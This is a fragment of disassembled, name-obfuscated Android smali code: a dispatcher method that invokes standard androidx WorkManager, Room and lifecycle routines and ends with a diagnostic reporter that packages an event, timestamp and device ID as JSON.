    iget-object v0, v1, Landroidx/constraintlayout/motion/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Ljava/util/concurrent/Callable;

    iget-object v2, v1, Landroidx/constraintlayout/motion/widget/؋;->ؤ:Ljava/lang/Object;

    check-cast v2, Lئٱنۃؖۊڄئ/آ;

    :try_start_8
    invoke-interface {v0}, Ljava/util/concurrent/Callable;->call()Ljava/lang/Object;

    move-result-object v0

    iget-object v3, v2, Lئٱنۃؖۊڄئ/آ;->أ:Ljava/lang/Object;

    check-cast v3, Lڍڤٜڞڽۧ/إ;

    sget v4, Lڍڤٜڞڽۧ/إ;->أ:I

    invoke-virtual {v3, v0}, Landroidx/concurrent/futures/AbstractResolvableFuture;->set(Ljava/lang/Object;)Z
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_8

    goto :goto_a

    :catch_8
    move-exception v0

    iget-object v2, v2, Lئٱنۃؖۊڄئ/آ;->أ:Ljava/lang/Object;

    check-cast v2, Lڍڤٜڞڽۧ/إ;

    sget v3, Lڍڤٜڞڽۧ/إ;->أ:I

    invoke-virtual {v2, v0}, Landroidx/concurrent/futures/AbstractResolvableFuture;->setException(Ljava/lang/Throwable;)Z

    :goto_a
    return-void

    :pswitch_d
    iget-object v0, v1, Landroidx/constraintlayout/motion/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Lڍڤٜڞڽۧ/؋;

    iget-object v2, v1, Landroidx/constraintlayout/motion/widget/؋;->ؤ:Ljava/lang/Object;

    check-cast v2, Ljava/lang/Runnable;

    iget v3, v0, Lڍڤٜڞڽۧ/؋;->ء:I

    invoke-static {v3}, Landroid/os/Process;->setThreadPriority(I)V

    iget-object v0, v0, Lڍڤٜڞڽۧ/؋;->آ:Landroid/os/StrictMode$ThreadPolicy;

    if-eqz v0, :cond_12

    invoke-static {v0}, Landroid/os/StrictMode;->setThreadPolicy(Landroid/os/StrictMode$ThreadPolicy;)V

    :cond_12
    invoke-interface {v2}, Ljava/lang/Runnable;->run()V

    return-void

    :pswitch_e
    iget-object v0, v1, Landroidx/constraintlayout/motion/widget/؋;->أ:Ljava/lang/Object;

    move-object v2, v0

    check-cast v2, Lڊ۟چڗۙ٦/د;

    iget-object v0, v1, Landroidx/constraintlayout/motion/widget/؋;->ؤ:Ljava/lang/Object;

    check-cast v0, Lڕۇۅؑۨؼ۫ە/؋;

    monitor-enter v2

    :try_start_9
    iget-object v3, v2, Lڊ۟چڗۙ٦/د;->ؠ:Ljava/util/Set;

    if-nez v3, :cond_13

    iget-object v3, v2, Lڊ۟چڗۙ٦/د;->؋:Ljava/util/Set;

    goto :goto_b

    :cond_13
    iget-object v3, v2, Lڊ۟چڗۙ٦/د;->ؠ:Ljava/util/Set;

    invoke-interface {v0}, Lڕۇۅؑۨؼ۫ە/؋;->get()Ljava/lang/Object;

    move-result-object v0

    :goto_b
    invoke-interface {v3, v0}, Ljava/util/Set;->add(Ljava/lang/Object;)Z
    :try_end_9
    .catchall {:try_start_9 .. :try_end_9} :catchall_0

    monitor-exit v2

    return-void

    :catchall_0
    move-exception v0

    monitor-exit v2

    throw v0

    :pswitch_f
    iget-object v0, v1, Landroidx/constraintlayout/motion/widget/؋;->أ:Ljava/lang/Object;

    move-object v2, v0

    check-cast v2, Lڊ۟چڗۙ٦/ر;

    iget-object v0, v1, Landroidx/constraintlayout/motion/widget/؋;->ؤ:Ljava/lang/Object;

    check-cast v0, Lڕۇۅؑۨؼ۫ە/؋;

    iget-object v3, v2, Lڊ۟چڗۙ٦/ر;->ؠ:Lڕۇۅؑۨؼ۫ە/؋;

    sget-object v5, Lڊ۟چڗۙ٦/ر;->آ:Lڊ۟چڗۙ٦/ئ;

    if-ne v3, v5, :cond_14

    monitor-enter v2

    :try_start_a
    iget-object v3, v2, Lڊ۟چڗۙ٦/ر;->؋:Landroidx/constraintlayout/core/state/ؠ;

    iput-object v4, v2, Lڊ۟چڗۙ٦/ر;->؋:Landroidx/constraintlayout/core/state/ؠ;

    iput-object v0, v2, Lڊ۟چڗۙ٦/ر;->ؠ:Lڕۇۅؑۨؼ۫ە/؋;

    monitor-exit v2
    :try_end_a
    .catchall {:try_start_a .. :try_end_a} :catchall_1

    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    return-void

    :catchall_1
    move-exception v0

    :try_start_b
    monitor-exit v2
    :try_end_b
    .catchall {:try_start_b .. :try_end_b} :catchall_1

    throw v0

    :cond_14
    new-instance v0, Ljava/lang/IllegalStateException;

    const-string v2, "provide() can be called only once."

    invoke-direct {v0, v2}, Ljava/lang/IllegalStateException;-><init>(Ljava/lang/String;)V

    throw v0

    :pswitch_10
    iget-object v0, v1, Landroidx/constraintlayout/motion/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Lcom/google/android/datatransport/runtime/scheduling/jobscheduling/JobInfoSchedulerService;

    iget-object v2, v1, Landroidx/constraintlayout/motion/widget/؋;->ؤ:Ljava/lang/Object;

    check-cast v2, Landroid/app/job/JobParameters;

    sget v3, Lcom/google/android/datatransport/runtime/scheduling/jobscheduling/JobInfoSchedulerService;->؋:I

    const/4 v3, 0x0

    invoke-virtual {v0, v2, v3}, Landroid/app/job/JobService;->jobFinished(Landroid/app/job/JobParameters;Z)V

    return-void

    :pswitch_11
    iget-object v0, v1, Landroidx/constraintlayout/motion/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Landroidx/work/impl/workers/ConstraintTrackingWorker;

    iget-object v2, v1, Landroidx/constraintlayout/motion/widget/؋;->ؤ:Ljava/lang/Object;

    check-cast v2, Lڃاـڂڅږ/؋;

    invoke-static {v0, v2}, Landroidx/work/impl/workers/ConstraintTrackingWorker;->ؠ(Landroidx/work/impl/workers/ConstraintTrackingWorker;Lڃاـڂڅږ/؋;)V

    return-void

    :pswitch_12
    iget-object v0, v1, Landroidx/constraintlayout/motion/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Landroidx/work/impl/utils/WorkForegroundRunnable;

    iget-object v2, v1, Landroidx/constraintlayout/motion/widget/؋;->ؤ:Ljava/lang/Object;

    check-cast v2, Landroidx/work/impl/utils/futures/SettableFuture;

    invoke-static {v0, v2}, Landroidx/work/impl/utils/WorkForegroundRunnable;->؋(Landroidx/work/impl/utils/WorkForegroundRunnable;Landroidx/work/impl/utils/futures/SettableFuture;)V

    return-void

    :pswitch_13
    iget-object v0, v1, Landroidx/constraintlayout/motion/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Ljava/util/List;

    iget-object v2, v1, Landroidx/constraintlayout/motion/widget/؋;->ؤ:Ljava/lang/Object;

    check-cast v2, Landroidx/work/impl/constraints/trackers/ConstraintTracker;

    invoke-static {v0, v2}, Landroidx/work/impl/constraints/trackers/ConstraintTracker;->؋(Ljava/util/List;Landroidx/work/impl/constraints/trackers/ConstraintTracker;)V

    return-void

    :pswitch_14
    iget-object v0, v1, Landroidx/constraintlayout/motion/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Landroidx/work/impl/background/greedy/TimeLimiter;

    iget-object v2, v1, Landroidx/constraintlayout/motion/widget/؋;->ؤ:Ljava/lang/Object;

    check-cast v2, Landroidx/work/impl/StartStopToken;

    invoke-static {v0, v2}, Landroidx/work/impl/background/greedy/TimeLimiter;->؋(Landroidx/work/impl/background/greedy/TimeLimiter;Landroidx/work/impl/StartStopToken;)V

    return-void

    :pswitch_15
    iget-object v0, v1, Landroidx/constraintlayout/motion/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Landroidx/work/impl/WorkerWrapper;

    iget-object v2, v1, Landroidx/constraintlayout/motion/widget/؋;->ؤ:Ljava/lang/Object;

    check-cast v2, Lڃاـڂڅږ/؋;

    invoke-static {v0, v2}, Landroidx/work/impl/WorkerWrapper;->؋(Landroidx/work/impl/WorkerWrapper;Lڃاـڂڅږ/؋;)V

    return-void

    :pswitch_16
    iget-object v0, v1, Landroidx/constraintlayout/motion/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Ljava/lang/Runnable;

    iget-object v2, v1, Landroidx/constraintlayout/motion/widget/؋;->ؤ:Ljava/lang/Object;

    check-cast v2, Landroidx/room/TransactionExecutor;

    invoke-static {v0, v2}, Landroidx/room/TransactionExecutor;->؋(Ljava/lang/Runnable;Landroidx/room/TransactionExecutor;)V

    return-void

    :pswitch_17
    iget-object v0, v1, Landroidx/constraintlayout/motion/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Landroidx/room/MultiInstanceInvalidationClient;

    iget-object v2, v1, Landroidx/constraintlayout/motion/widget/؋;->ؤ:Ljava/lang/Object;

    check-cast v2, [Ljava/lang/String;

    invoke-static {v0, v2}, Landroidx/room/MultiInstanceInvalidationClient$callback$1;->؋(Landroidx/room/MultiInstanceInvalidationClient;[Ljava/lang/String;)V

    return-void

    :pswitch_18
    iget-object v0, v1, Landroidx/constraintlayout/motion/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Landroidx/profileinstaller/ProfileInstallerInitializer;

    iget-object v2, v1, Landroidx/constraintlayout/motion/widget/؋;->ؤ:Ljava/lang/Object;

    check-cast v2, Landroid/content/Context;

    invoke-static {v0, v2}, Landroidx/profileinstaller/ProfileInstallerInitializer;->؋(Landroidx/profileinstaller/ProfileInstallerInitializer;Landroid/content/Context;)V

    return-void

    :pswitch_19
    iget-object v0, v1, Landroidx/constraintlayout/motion/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Landroidx/lifecycle/DispatchQueue;

    iget-object v2, v1, Landroidx/constraintlayout/motion/widget/؋;->ؤ:Ljava/lang/Object;

    check-cast v2, Ljava/lang/Runnable;

    invoke-static {v0, v2}, Landroidx/lifecycle/DispatchQueue;->؋(Landroidx/lifecycle/DispatchQueue;Ljava/lang/Runnable;)V

    return-void

    :pswitch_1a
    iget-object v0, v1, Landroidx/constraintlayout/motion/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Landroidx/core/content/res/ResourcesCompat$FontCallback;

    iget-object v2, v1, Landroidx/constraintlayout/motion/widget/؋;->ؤ:Ljava/lang/Object;

    check-cast v2, Landroid/graphics/Typeface;

    invoke-static {v0, v2}, Landroidx/core/content/res/ResourcesCompat$FontCallback;->ؠ(Landroidx/core/content/res/ResourcesCompat$FontCallback;Landroid/graphics/Typeface;)V

    return-void

    :pswitch_1b
    iget-object v0, v1, Landroidx/constraintlayout/motion/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Landroidx/constraintlayout/motion/widget/ViewTransition;

    iget-object v2, v1, Landroidx/constraintlayout/motion/widget/؋;->ؤ:Ljava/lang/Object;

    check-cast v2, [Landroid/view/View;

    invoke-static {v0, v2}, Landroidx/constraintlayout/motion/widget/ViewTransition;->؋(Landroidx/constraintlayout/motion/widget/ViewTransition;[Landroid/view/View;)V

    return-void

    :goto_c
    iget-object v0, v1, Landroidx/constraintlayout/motion/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Ljava/lang/String;

    iget-object v2, v1, Landroidx/constraintlayout/motion/widget/؋;->ؤ:Ljava/lang/Object;

    check-cast v2, Ljava/lang/String;

    sget-object v3, Lڝږ؁ڋ/ر;->ؠ:Ljava/util/concurrent/ExecutorService;

    :try_start_c
    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    const-string v4, "type"

    invoke-virtual {v3, v4, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v0, "msg"

    invoke-virtual {v3, v0, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v0, "ts"

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v4

    invoke-virtual {v3, v0, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    invoke-static {}, Lڜٟٱڀ/د;->ؠ()Lڜٟٱڀ/د;

    move-result-object v0
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_9

    const-string v2, ""

    if-eqz v0, :cond_15

    :try_start_d
    iget-object v4, v0, Lڜٟٱڀ/د;->إ:Ljava/lang/String;

    goto :goto_d

    :cond_15
    move-object v4, v2

    :goto_d
    const-string v5, "deviceId"

    if-eqz v4, :cond_16

    move-object v2, v4

    :cond_16
    invoke-virtual {v3, v5, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    if-eqz v0, :cond_17

    invoke-virtual {v0}, Lڜٟٱڀ/د;->آ()Z

    move-result v2

    if-eqz v2, :cond_17

    iget-object v0, v0, Lڜٟٱڀ/د;->آ:Lةؽڗںۍټ٘/ء;

    if-eqz v0, :cond_17

    const-string v2, "diag"

    invoke-virtual {v0, v2, v3}, Lةؽڗںۍټ٘/ء;->آ(Ljava/lang/String;Lorg/json/JSONObject;)Z

    goto :goto_e

    :cond_17
    invoke-static {v3}, Lڝږ؁ڋ/ر;->ؠ(Lorg/json/JSONObject;)V
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_9

    goto :goto_e

    :catch_9
    move-exception v0

    const-string v2, "DiagReporter"

    const-string v3, "reportEvent error"

    invoke-static {v2, v3, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_e
    return-void

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_1b
        :pswitch_1a
        :pswitch_19
        :pswitch_18
        :pswitch_17
        :pswitch_16
        :pswitch_15
        :pswitch_14
        :pswitch_13
        :pswitch_12
        :pswitch_11
        :pswitch_10
        :pswitch_f
        :pswitch_e
        :pswitch_0
        :pswitch_d
        :pswitch_c
        :pswitch_0
        :pswitch_b
        :pswitch_a
        :pswitch_9
        :pswitch_8
        :pswitch_7
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
    .end packed-switch
.end method
